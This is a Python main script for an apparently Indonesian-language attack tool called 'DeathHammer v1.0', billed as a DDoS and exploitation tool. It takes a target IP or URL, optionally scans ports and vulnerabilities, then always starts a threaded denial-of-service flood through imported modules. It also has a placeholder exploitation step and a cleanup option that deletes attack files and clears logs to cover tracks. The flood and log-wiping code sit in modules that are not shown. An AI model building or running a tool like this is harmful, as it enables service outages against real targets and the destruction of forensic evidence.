import argparse
import json
import time
from core import scanner
from modules import dos, exploit, cleanup

def main():
    parser = argparse.ArgumentParser(description="DeathHammer v1.0 - Tools DDOS dan Eksploitasi")
    parser.add_argument("target", help="Target IP atau URL")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port target (default: 80)")
    parser.add_argument("-t", "--threads", type=int, help="Jumlah threads (default: dari config)")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan port dan kerentanan")
    parser.add_argument("-x", "--exploit", action="store_true", help="Eksploitasi kerentanan")
    parser.add_argument("-c", "--cleanup", action="store_true", help="Bersihkan file dan log")

    args = parser.parse_args()

    config = {}
    try:
        with open("config.json", "r") as f:
            config = json.load(f)
    except FileNotFoundError:
        print("[-] config.json tidak ditemukan, menggunakan default.")

    threads = args.threads if args.threads else config.get("default_threads", 200)

    print("===================================")
    print(" DeathHammer v1.0 - Made by Danxy ")
    print("===================================")

    if args.scan:
        print("[+] Memulai scanning...")
        s = scanner.Scanner(args.target)
        open_ports = s.scan_ports(config.get("ports_to_scan", [80, 443]))
        s.check_vulnerabilities()

    attacker = None
    try:
        attacker = dos.start_dos(args.target, args.port, threads)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt detected. Menghentikan serangan...")
        dos.stop_dos(attacker)

    if args.exploit:
        print("[+] Memulai eksploitasi...")
        # Tambahkan logika untuk eksploitasi kerentanan
        # Contoh: exploit.exploit_vulnerability(args.target, "http://target.com/vulnerable", {"data": "payload"})
        print("[+] Eksploitasi selesai.")

    if args.cleanup:
        print("[+] Membersihkan...")
        cleanup.delete_files("/tmp/attack_files")
        cleanup.clear_logs()
        print("[+] Pembersihan selesai.")

if __name__ == "__main__":
    main()
